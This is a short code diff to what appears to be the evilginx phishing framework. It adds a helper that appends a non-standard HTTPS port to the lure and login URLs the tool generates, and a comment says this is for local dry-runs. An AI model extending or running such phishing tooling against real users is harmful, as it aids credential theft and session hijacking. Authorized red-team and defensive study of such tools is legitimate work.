@@ -776,6 +776,16 @@ func (p *Phishlet) GetPhishHosts(use_wildcards bool) []string {
 	return ret
 }
 
+// phishkitPortSuffix returns ":<port>" when evilginx runs on a non-standard
+// HTTPS port (e.g. 8443 for privilege-free local dry-runs), else "".
+func (p *Phishlet) phishkitPortSuffix() string {
+	port := p.cfg.GetHttpsPort()
+	if port != 0 && port != 443 {
+		return fmt.Sprintf(":%d", port)
+	}
+	return ""
+}
+
 func (p *Phishlet) GetLureUrl(path string) (string, error) {
 	var ret string
 	host := p.cfg.GetBaseDomain()
@@ -787,12 +797,12 @@ func (p *Phishlet) GetLureUrl(path string) (string, error) {
 			}
 		}
 	}
-	ret = "https://" + host + path
+	ret = "https://" + host + p.phishkitPortSuffix() + path
 	return ret, nil
 }
 
 func (p *Phishlet) GetLoginUrl() string {
-	return "https://" + p.login.domain + p.login.path
+	return "https://" + p.login.domain + p.phishkitPortSuffix() + p.login.path
 }
 
 func (p *Phishlet) GetLandingPhishHost() string {
